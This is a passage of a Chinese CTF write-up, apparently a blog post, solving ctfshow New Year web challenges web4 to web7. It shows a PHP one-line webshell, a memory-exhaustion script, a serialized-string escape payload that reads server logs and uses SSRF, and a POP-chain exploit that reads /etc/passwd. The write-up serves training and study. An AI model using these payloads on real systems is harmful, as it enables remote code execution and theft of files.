<h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><h2 id="返回后缀名的函数"><a href="#返回后缀名的函数" class="headerlink" title="#返回后缀名的函数"></a>#返回后缀名的函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span>=  <span class="title function_ invoke__">call_user_func</span>((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$key</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;虎年大吉，新春快乐！&quot;</span>);</span><br><span class="line"></span><br><span class="line">虎年大吉，新春快乐！</span><br></pre></td></tr></table></figure>

<p><code>file_put_contents()</code>用于将数据内容写入文件，第一个参数就是传入文件的名字或者文件路径，而第二个参数就是我们的文件内容</p>
<p>文件内容是一句话木马，那么我们需要传入一个参数是可以返回我们的文件路径或者文件名的</p>
<p>一开始是使用的getcwd()函数去返回当前的目录，但是考虑到没有具体的文件名可以写不进去，所以后面查了一下可以用spl_autoload_extensions()函数</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250203110917269.png" alt="image-20250203110917269"></p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250203111403687-1738552445715-11.png" alt="image-20250203111403687"></p>
<p>可以看到这里默认的扩展名是.inc,.php</p>
<p>然后我们传入spl_autoload_extensions，然后访问后可以用蚁剑连接也可以进行传参rce</p>
<h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><h2 id="使用内存溢出绕过file-put-contents机制"><a href="#使用内存溢出绕过file-put-contents机制" class="headerlink" title="#使用内存溢出绕过file_put_contents机制"></a>#使用内存溢出绕过file_put_contents机制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;🐯🐯.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;🐯&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">$🐯 = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;hu&quot;</span>, <span class="string">&quot;🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯🐯&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;🐯&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;🐯&quot;</span>, $🐯);</span><br></pre></td></tr></table></figure>

<p>如果 <code>filename</code> 不存在，将会创建文件。反之，存在的文件将会重写。</p>
<p>在使用file_put_contents()函数的时候PHP 需要分配额外的内存来存储结果。如果结果字符串的总大小超过了 PHP 的内存限制，就会导致内存溢出。</p>
<p>而我们是要直接下载🐯去读取flag的，所以这里可以传入一大堆hu来让php报错，导致🐯文件不被覆盖，然后访问🐯下载即可</p>
<p>注意这里hu太多会导致上传失败提示文件过大，hu过少会导致php不报错，具体来说传入524280个hu即可</p>
<p>写个脚本吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://63b4e936-07a0-43fc-a8ac-1cff415e6815.challenge.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;🐯&quot;</span> : <span class="number">524280</span>*<span class="string">&quot;hu&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>然后我们访问下载文件🐯就可以拿到flag了</p>
<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><h2 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="#字符串逃逸"></a>#字符串逃逸</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$function</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;POST&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;daniu&#x27;</span>,<span class="string">&#x27;happyhuyear&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;<span class="comment">//正则匹配</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;<span class="comment">//清空session会话内容</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;GET&#x27;</span>]);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;file&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;/root/flag&quot;</span>);</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;GET&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="comment">//出题人已经拿过flag，题目正常,也就是说...</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;file&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先审代码</p>
<p>1.首先通过get获取一个值给$function变量</p>
<p>2.一个filter过滤函数的声明</p>
<p>3.unset()函数会清空session会话</p>
<p>4.将 $_function的值赋给 $_SESSION[‘function’]</p>
<p>5.通过post表单提交一个值给get参数并作为数组把键和值提取出来</p>
<p>6.设置session会话中file的值</p>
<p>7.使用filter过滤函数过滤后序列化session会话的数据并将结果赋值给$serialize_info</p>
<p>8.如果function的值为”GET”就反序列化serialize_info 并赋值给 $userinfo</p>
<p>9.使用<code>file_get_contents(base64_decode($userinfo[&#39;file&#39;]))</code> 将读取指定路径（<code>/root/flag</code>）的文件内容并输出。</p>
<p>所以这里的话我们get传参POST的值显而易见是需要设置为GET的，而关键就在于我们post传参的数组怎么设置了</p>
<p>这里的话考的是一个反序列化的字符串逃逸，因为这里题目注释里头提示出题人已经拿过flag了，所以我们可以在日志里面进行查看出题人的访问日志</p>
<p>我们先看一下服务器的版本是nginx&#x2F;1.20.1，那nginx的成功日志的文件目录一般就是&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log，，base64编码后是L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw&#x3D;&#x3D;而我们题目中的目录是&#x2F;root&#x2F;flag，base64编码后是<code>L3Jvb3QvZmxhZw==</code>，filter过滤函数是字符串减少的</p>
<p>所以我们的exp就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原来题中的$serialize_info为</span><br><span class="line">a:2:&#123;s:8:&quot;function&quot;;N;s:4:&quot;file&quot;;s:16:&quot;L3Jvb3QvZmxhZw==&quot;;&#125;</span><br><span class="line">我们的payload</span><br><span class="line">GET[_SESSION][ctfshowdaniu]=s:1:&quot;;s:1:&quot;1&quot;;s:4:&quot;file&quot;;s:36:&quot;L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==&quot;;&#125;</span><br><span class="line">因为是extract($_POST[&#x27;GET&#x27;]);，我们需要POST一个数组GET[_SESSION][ctfshowdaniu],这样传进去就可以得到$_SESSION数组变量，ctfshowdaniu是数组变量中的一个键。</span><br></pre></td></tr></table></figure>

<p>所以原来我们的session数组为</p>
<p>{</p>
<p>“function”&#x3D;&gt;NULL</p>
<p>“file”&#x3D;&gt;L3Jvb3QvZmxhZw&#x3D;&#x3D;</p>
<p>}</p>
<p>传入后值覆盖</p>
<p>{</p>
<p>“ctfshowdaniu”&#x3D;&gt;s:1:”;s:1:“1”;s:4:“file”;s:36:“L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw&#x3D;&#x3D;”;}</p>
<p>“file”&#x3D;&gt;L3Jvb3QvZmxhZw&#x3D;&#x3D;</p>
<p>}</p>
<p>序列化后的结果是</p>
<p>a:2:{s:12:”ctfshowdaniu”;<code>s:70:&quot;s:1:&quot;;s:1:“1”;s:4:“file”;s:36:“L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw==”;&#125;&quot;</code>;s:4:”file”;s:16:”L3Jvb3QvZmxhZw&#x3D;&#x3D;”;}</p>
<p>这里有人会问为什么我们要传入ctfshowdaniu？这里是为了利用filter函数中的<code>str_replace</code>替换成空，变成字符串减少的字符串逃逸。</p>
<p>经过filter过滤后变成</p>
<p>a:2:{s:12:”<code>&quot;;s:70:&quot;s:1:</code>“;s:1:“1”;s:4:“file”;s:36:“L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw&#x3D;&#x3D;”;}”;s:4:”file”;s:16:”L3Jvb3QvZmxhZw&#x3D;&#x3D;”;}</p>
<p><code>ctfshowdaniu</code>刚好12个字符，替换成空后，需要12个字符来填充<code>&quot;;s:70:&quot;s:1:</code>刚好12个字符，所以反序列化后的结果是</p>
<p>{</p>
<p>“”;&#96;s:70:”s:1:”&#x3D;&gt;”1”</p>
<p>“file”&#x3D;&gt;”L3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZw&#x3D;&#x3D;”</p>
<p>}</p>
<p>这样就达到一个字符的逃逸，让后面的<code>s:4:&quot;file&quot;;s:16:&quot;L3Jvb3QvZmxhZw==&quot;;</code>不起作用了。</p>
<p>成功进行变量覆盖，可以看到日志文件</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250216222140948.png" alt="image-20250216222140948"></p>
<p>可以看到在我们传入?POST&#x3D;GET之前是有访问了&#x2F;ctfshow这个目录的，那我们换成&#x2F;ctfshow就可以了</p>
<p>但是一开始访问没出来结果，猜测是在本地的目录中的&#x2F;ctfshow需要进行ssrf，所以设置成<code>http://127.0.0.1/ctfshow</code></p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get传入?POST=GET</span><br><span class="line">post传入GET[_SESSION][ctfshowdaniu]=s:1:&quot;;s:1:&quot;1&quot;;s:4:&quot;file&quot;;s:32:&quot;aHR0cDovLzEyNy4wLjAuMS9jdGZzaG93&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>就可以拿到flag了</p>
<h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="#session反序列化"></a>#session反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$happy</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$happy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Happy_New_Year!!!</span><br></pre></td></tr></table></figure>

<p>先传入source看一下class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Happy</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$happy</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;happy=<span class="string">&quot;Happy_New_Year!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;happy-&gt;happy;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span>&#123;<span class="comment">//当调用对象中不存在的方法会自动调用该方法</span></span><br><span class="line">                <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;happy-&gt;<span class="variable">$funName</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)//将数据写入不可访问或者不存在的属性</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;happy-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)//当你尝试将一个对象像函数一样调用时，<span class="title">__invoke</span>(<span class="params"></span>) 会被触发。</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;happy;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_New_</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$daniu</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$robot</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$notrobot</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_New_</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;daniu=<span class="string">&quot;I&#x27;m daniu.&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;robot=<span class="string">&quot;I&#x27;m robot.&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;notrobot=<span class="string">&quot;I&#x27;m not a robot.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span>&#123;<span class="comment">//当调用对象中不存在的方法会自动调用该方法</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu.<span class="variable">$funName</span>.<span class="string">&quot;not exists!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)//当你尝试将一个对象像函数一样调用时，<span class="title">__invoke</span>(<span class="params"></span>) 会被触发</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;daniu=<span class="variable language_">$this</span>-&gt;robot;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)//当一个对象被当作一个字符串被调用</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$robot</span>=<span class="variable language_">$this</span>-&gt;robot;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;daniu-&gt;<span class="variable">$robot</span>=<span class="variable language_">$this</span>-&gt;notrobot;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;<span class="comment">//读取不可访问或者是不存在的属性时触发</span></span><br><span class="line">               <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu.<span class="variable">$key</span>.<span class="string">&quot;not exists!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$zodiac</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)//当你尝试将一个对象像函数一样调用时，<span class="title">__invoke</span>(<span class="params"></span>) 会被触发。</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;happy &quot;</span>.<span class="variable language_">$this</span>-&gt;zodiac.<span class="string">&quot; year!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;zodiac=<span class="string">&quot;Hu&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)//当一个对象被当作一个字符串被调用</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)#//将数据写入不可访问或者不存在的属性</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;zodiac));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;zodiac = <span class="string">&#x27;hu&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果单从Happy类中看的话是并没有发现什么危险函数可以用的，但是我们可以从Year类中看到一个file_get_contents()函数，那我们试着写一下链子</p>
<p><code>Happy:__destruct()=&gt;_New_:__get()=&gt;_New_:__toString()=&gt;Year:__toString()=&gt;Year:Show()</code></p>
<p>但是这里的话可以看到在源码中没有什么可用的参数去进行反序列化的操作，猜测可能是通过session反序列化去进行，当会话开始时，session_start()即会话开始时，会触发回调函数read()，该函数会返回会话数据，php会自动反序列化数据</p>
<p>我们传入一个phpinfo参数看看</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250217200805741.png" alt="image-20250217200805741"></p>
<p>可以看到脚本利用的反序列化引擎是php，而php.ini默认使用的引擎是php_serialize，这里引擎不一样，也就说明可能可以触发反序列化攻击了</p>
<p>然后我们知道php:存储方式是，键名+竖线+经过serialize()函数序列处理的值，</p>
<p>在phpinfo中可以发现，<code>session.upload_progress.enabled</code>为on，<code>session.upload_progress.cleanup</code>为off</p>
<p>什么意思呢?<code>session.upload_progress.enabled</code>为on意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中。<code>session.upload_progress.cleanup</code>为off意味着这些信息保存之后不会被清除掉，所以这道题我们是不需要打条件竞争的</p>
<p>编写我们的exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//`Happy:__destruct()=&gt;_New_:__get()=&gt;_New_:__toString()=&gt;Year:__toString()=&gt;Year:Show()`</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$happy</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_New_</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$daniu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$robot</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$notrobot</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$zodiac</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();<span class="comment">//实例化Happy对象</span></span><br><span class="line"><span class="variable">$a</span>-&gt;happy=<span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();<span class="comment">//对象调用摧毁时会触发__destruct,将happy赋值为一个新的__New__对象访问happy属性,触发new的get方法</span></span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu=<span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();<span class="comment">//echo语句把对象当作字符串输出，将daniu赋值为一个新的__New__对象,触发tostring方法</span></span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;daniu=<span class="keyword">new</span> <span class="title class_">Year</span>();<span class="comment">//将daniu赋值为一个新的Year对象，（string）转换，就是将对象当作字符串，触发year的tostring方法，然后到show方法。</span></span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;robot=<span class="string">&quot;zodiac&quot;</span>;<span class="comment">//在__New__的__toString方法中会访问daniu中的$robot属性,所以让robot的值为Year中的属性zodiac，从而访问到zodiac属性</span></span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;notrobot=<span class="string">&quot;/etc/passwd&quot;</span>;<span class="comment">//将访问的zodiac属性赋值为/etc/passwd</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span 